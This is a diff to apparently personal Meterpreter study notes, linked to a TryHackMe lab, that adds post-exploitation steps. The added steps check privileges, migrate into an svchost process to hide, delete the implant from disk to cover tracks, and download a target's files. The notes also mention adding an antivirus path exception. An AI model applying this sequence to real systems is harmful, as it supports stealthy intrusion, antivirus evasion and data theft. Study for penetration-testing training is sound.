@@ -94,5 +94,23 @@
 
 - Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.
 
-### All Credit
-- https://tryhackme.com/room/meterpreter
+## New Meterpreter Session Steps 
+- Assuming you gained access, inserted AV Path Exception, wrote implant to disk and executed to catch you callback 
+````
+getuid #see your user context
+getpid #identify pid you are running as (should be the pid of your msfvenom implant named whatever you assigned)
+getprivs #see enabled process privileges
+ps #view the whole process list and pick and svchost process within the same user context, get its pid number
+migrate XXXX #to the pid of the svchost process 
+getpid #confirm new pid
+ps #ensure it is of the correct process 
+del /path/to/implant #remove implant artifact from disk 
+````
+- Now you are set up and running as a thread in the address space of the `svchost.exe` process 
+### File collect with meterpreter 
+- `download` and `upload` commands 
+- Ensure you are escaping the windows "\"
+- Example:
+````
+download C:\\Users\\Administrator\\Desktop\\secret.txt
+````
